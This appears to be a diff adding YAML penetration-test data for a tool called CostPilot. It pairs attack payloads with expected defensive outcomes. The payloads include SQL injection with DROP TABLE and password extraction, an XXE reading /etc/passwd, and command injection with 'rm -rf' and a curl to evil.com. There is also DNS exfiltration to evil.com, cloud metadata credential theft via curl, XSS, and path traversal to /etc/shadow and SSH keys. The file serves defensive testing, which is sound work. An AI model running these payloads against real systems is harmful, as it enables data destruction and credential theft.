@@ -1,0 +1,354 @@
+# CostPilot Security Testing: Penetration Testing
+# Test data for penetration testing scenarios
+
+# API Endpoint Penetration Testing
+api_endpoint_penetration:
+  metadata:
+    test_case: "api_endpoint_penetration"
+    description: "Penetration testing of API endpoints"
+    test_type: "penetration_testing"
+    target: "api_endpoints"
+    expected_findings: "no_successful_breaches"
+  test_scenarios:
+    authentication_bypass:
+      endpoint: "/api/v1/plans"
+      methods: ["GET", "POST", "PUT", "DELETE"]
+      attack_vectors:
+        - type: "jwt_manipulation"
+          payload: "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+          expected_result: "access_denied"
+        - type: "api_key_brute_force"
+          payload: "attempts_1000_per_minute"
+          expected_result: "rate_limited"
+        - type: "session_hijacking"
+          payload: "stolen_session_cookie"
+          expected_result: "invalid_session"
+
+    input_validation_attacks:
+      endpoint: "/api/v1/costs/analyze"
+      attack_vectors:
+        - type: "sql_injection"
+          payload: '{"query": "SELECT * FROM plans WHERE id = 1; DROP TABLE users; --"}'
+          expected_result: "sanitized_input"
+        - type: "nosql_injection"
+          payload: "{\"filter\": {\"$where\": \"this.username == 'admin'\"}}"
+          expected_result: "input_validation"
+        - type: "xml_external_entity"
+          payload: |
+            <?xml version="1.0"?>
+            <!DOCTYPE foo [
+            <!ENTITY xxe SYSTEM "file:///etc/passwd">
+            ]>
+            <foo>&xxe;</foo>
+          expected_result: "xxe_prevention"
+
+    business_logic_attacks:
+      endpoint: "/api/v1/billing"
+      attack_vectors:
+        - type: "parameter_tampering"
+          payload: '{"amount": "-1000.00", "currency": "USD"}'
+          expected_result: "validation_error"
+        - type: "mass_assignment"
+          payload: '{"user_id": "123", "admin": true, "balance": "999999"}'
+          expected_result: "field_restriction"
+        - type: "race_condition"
+          payload: "concurrent_requests_to_modify_balance"
+          expected_result: "atomic_operations"
+
+# CLI Interface Penetration Testing
+cli_interface_penetration:
+  metadata:
+    test_case: "cli_interface_penetration"
+    description: "Penetration testing of command-line interface"
+    test_type: "penetration_testing"
+    target: "cli_interface"
+    expected_findings: "secure_cli_execution"
+  test_scenarios:
+    command_injection:
+      commands:
+        - command: 'costpilot analyze --file "; rm -rf /home/user"'
+          expected_result: "command_sanitization"
+        - command: "costpilot process `cat /etc/passwd`"
+          expected_result: "argument_validation"
+        - command: 'costpilot --config "$(curl http://evil.com/malicious)"'
+          expected_result: "input_sanitization"
+
+    file_system_attacks:
+      commands:
+        - command: "costpilot analyze --file ../../../etc/passwd"
+          expected_result: "path_traversal_prevention"
+        - command: "costpilot --output /etc/passwd"
+          expected_result: "output_path_validation"
+        - command: "costpilot --config ~/.ssh/id_rsa"
+          expected_result: "sensitive_file_protection"
+
+    environment_variable_attacks:
+      commands:
+        - command: "PATH=/evil:$PATH costpilot analyze"
+          expected_result: "path_security"
+        - command: "LD_PRELOAD=/evil/library.so costpilot"
+          expected_result: "library_prevention"
+        - command: "HOME=/etc costpilot"
+          expected_result: "home_directory_validation"
+
+# File Processing Penetration Testing
+file_processing_penetration:
+  metadata:
+    test_case: "file_processing_penetration"
+    description: "Penetration testing of file processing capabilities"
+    test_type: "penetration_testing"
+    target: "file_processing"
+    expected_findings: "safe_file_handling"
+  test_scenarios:
+    malicious_file_uploads:
+      file_types:
+        - type: "zip_bomb"
+          file: "10gb_zip_bomb.zip"
+          expected_result: "size_limit_enforcement"
+        - type: "polyglot_file"
+          file: "image_with_embedded_script.jpg"
+          expected_result: "content_validation"
+        - type: "malicious_xml"
+          file: "xxe_attack.xml"
+          expected_result: "xml_security"
+
+    path_traversal_attacks:
+      file_paths:
+        - path: "../../../etc/passwd"
+          expected_result: "path_sanitization"
+        - path: "/etc/shadow"
+          expected_result: "absolute_path_blocking"
+        - path: "....//....//....//etc/passwd"
+          expected_result: "dot_slash_prevention"
+
+    file_type_confusion:
+      files:
+        - filename: "malicious.exe"
+          content_type: "text/plain"
+          expected_result: "mime_type_validation"
+        - filename: "script.py"
+          content_type: "text/plain"
+          expected_result: "extension_validation"
+        - filename: "data.json"
+          content_type: "application/octet-stream"
+          expected_result: "content_analysis"
+
+# Network-Level Penetration Testing
+network_penetration:
+  metadata:
+    test_case: "network_penetration"
+    description: "Network-level penetration testing"
+    test_type: "penetration_testing"
+    target: "network_infrastructure"
+    expected_findings: "secure_network_configuration"
+  test_scenarios:
+    port_scanning:
+      target_ports: [22, 80, 443, 3306, 5432, 6379]
+      expected_result: "minimal_exposed_ports"
+      acceptable_ports: [80, 443]
+
+    service_enumeration:
+      services:
+        - service: "ssh"
+          version: "OpenSSH_8.9"
+          expected_result: "up_to_date_version"
+        - service: "nginx"
+          version: "1.20.1"
+          expected_result: "no_known_vulnerabilities"
+        - service: "postgres"
+          version: "14.2"
+          expected_result: "restricted_access"
+
+    ssl_tls_testing:
+      certificate_checks:
+        - check: "valid_certificate"
+          expected_result: "valid_cert"
+        - check: "strong_cipher_suites"
+          expected_result: "modern_ciphers_only"
+        - check: "hsts_header"
+          expected_result: "hsts_enabled"
+        - check: "secure_renegotiation"
+          expected_result: "secure_renegotiation"
+
+# Database Penetration Testing
+database_penetration:
+  metadata:
+    test_case: "database_penetration"
+    description: "Database-level penetration testing"
+    test_type: "penetration_testing"
+    target: "database_layer"
+    expected_findings: "secure_database_access"
+  test_scenarios:
+    sql_injection_advanced:
+      injection_points:
+        - point: "user_input_fields"
+          payload: "1' UNION SELECT username, password FROM users --"
+          expected_result: "parameterized_queries"
+        - point: "order_by_clause"
+          payload: "name; DROP TABLE users; --"
+          expected_result: "input_sanitization"
+        - point: "limit_clause"
+          payload: "1; WAITFOR DELAY '0:0:10' --"
+          expected_result: "time_based_detection"
+
+    privilege_escalation:
+      attack_vectors:
+        - type: "vertical_escalation"
+          payload: "GRANT SUPER TO current_user"
+          expected_result: "privilege_restriction"
+        - type: "horizontal_escalation"
+          payload: "UPDATE users SET role='admin' WHERE id!=current_user_id"
+          expected_result: "row_level_security"
+
+    data_exfiltration:
+      attack_vectors:
+        - type: "dns_exfiltration"
+          payload: "SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.evil.com\\abc'))"
+          expected_result: "dns_egress_filtering"
+        - type: "time_based_exfiltration"
+          payload: "IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64, SLEEP(5), 0)"
+          expected_result: "timing_attack_prevention"
+
+# Web Application Penetration Testing
+web_application_penetration:
+  metadata:
+    test_case: "web_application_penetration"
+    description: "Web application penetration testing"
+    test_type: "penetration_testing"
+    target: "web_interface"
+    expected_findings: "secure_web_application"
+  test_scenarios:
+    cross_site_scripting:
+      attack_vectors:
+        - type: "reflected_xss"
+          payload: "<script>alert(document.cookie)</script>"
+          expected_result: "xss_prevention"
+        - type: "stored_xss"
+          payload: "<img src=x onerror=alert(1)>"
+          expected_result: "input_sanitization"
+        - type: "dom_xss"
+          payload: "javascript:alert(1)"
+          expected_result: "url_validation"
+
+    cross_site_request_forgery:
+      attack_vectors:
+        - type: "csrf_attack"
+          payload: '<form action="/api/delete" method="POST"><input type="hidden" name="id" value="123"></form>'
+          expected_result: "csrf_token_validation"
+        - type: "csrf_with_xss"
+          payload: "combined_xss_csrf_attack"
+          expected_result: "multi_layer_protection"
+
+    clickjacking:
+      attack_vectors:
+        - type: "iframe_overlay"
+          payload: '<iframe src="https://costpilot.com" style="opacity:0.1"></iframe>'
+          expected_result: "x_frame_options"
+        - type: "css_overlay"
+          payload: "position:absolute;top:0;left:0;width:100%;height:100%"
+          expected_result: "frame_busting"
+
+# Cloud Infrastructure Penetration Testing
+cloud_infrastructure_penetration:
+  metadata:
+    test_case: "cloud_infrastructure_penetration"
+    description: "Cloud infrastructure penetration testing"
+    test_type: "penetration_testing"
+    target: "cloud_infrastructure"
+    expected_findings: "secure_cloud_configuration"
+  test_scenarios:
+    metadata_service_attacks:
+      attack_vectors:
+        - type: "ssrf_to_metadata"
+          payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+          expected_result: "metadata_service_protection"
+        - type: "instance_profile_abuse"
+          payload: "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance-role"
+          expected_result: "iam_role_restriction"
+
+    misconfigured_s3_buckets:
+      attack_vectors:
+        - type: "public_bucket_enumeration"
+          payload: "aws s3 ls s3://costpilot-data/ --no-sign-request"
+          expected_result: "private_bucket_configuration"
+        - type: "bucket_policy_exploitation"
+          payload: "exploit_overly_permissive_bucket_policy"
+          expected_result: "least_privilege_policy"
+
+    ec2_instance_attacks:
+      attack_vectors:
+        - type: "ssm_parameter_abuse"
+          payload: "aws ssm get-parameter --name /aws/service/ami-amazon-linux-latest/amzn2-ami-hvm-x86_64-gp2"
+          expected_result: "ssm_parameter_restriction"
+        - type: "user_data_exposure"
+          payload: "curl http://169.254.169.254/latest/user-data"
+          expected_result: "user_data_protection"
+
+# Mobile/API Client Penetration Testing
+api_client_penetration:
+  metadata:
+    test_case: "api_client_penetration"
+    description: "Penetration testing of API clients and mobile apps"
+    test_type: "penetration_testing"
+    target: "api_clients"
+    expected_findings: "secure_client_applications"
+  test_scenarios:
+    client_side_attacks:
+      attack_vectors:
+        - type: "binary_reversing"
+          target: "costpilot-cli"
+          expected_result: "code_obfuscation"
+        - type: "memory_dumping"
+          target: "running_process"
+          expected_result: "memory_protection"
+        - type: "api_key_extraction"
+          target: "client_storage"
+          expected_result: "secure_key_storage"
+
+    man_in_the_middle:
+      attack_vectors:
+        - type: "ssl_stripping"
+          payload: "downgrade_https_to_http"
+          expected_result: "hsts_enforcement"
+        - type: "certificate_pinning_bypass"
+          payload: "frida_ssl_unpinning"
+          expected_result: "certificate_pinning"
+        - type: "dns_spoofing"
+          payload: "redirect_to_malicious_domain"
+          expected_result: "dnssec_validation"
+
+# Supply Chain Penetration Testing
+supply_chain_penetration:
+  metadata:
+    test_case: "supply_chain_penetration"
+    description: "Supply chain attack penetration testing"
+    test_type: "penetration_testing"
+    target: "supply_chain"
+    expected_findings: "secure_supply_chain"
+  test_scenarios:
+    dependency_confusion:
+      attack_vectors:
+        - type: "package_name_squatting"
+          payload: "create_package_with_similar_name"
+          expected_result: "package_name_validation"
+        - type: "version_confusion"
+          payload: "1.0.0 vs 1.0.0-alpha"
+          expected_result: "version_pinning"
+
+    build_pipeline_attacks:
+      attack_vectors:
+        - type: "ci_cd_compromise"
+          payload: "inject_malicious_build_step"
+          expected_result: "pipeline_security"
+        - type: "artifact_tampering"
+          payload: "modify_release_artifacts"
+          expected_result: "artifact_signing_verification"
+
+    third_party_risks:
+      attack_vectors:
+        - type: "compromised_dependency"
+          payload: "backdoored_library_version"
+          expected_result: "dependency_verification"
+        - type: "malicious_contributor"
+          payload: "contributor_with_malicious_pr"
+          expected_result: "code_review_requirements"
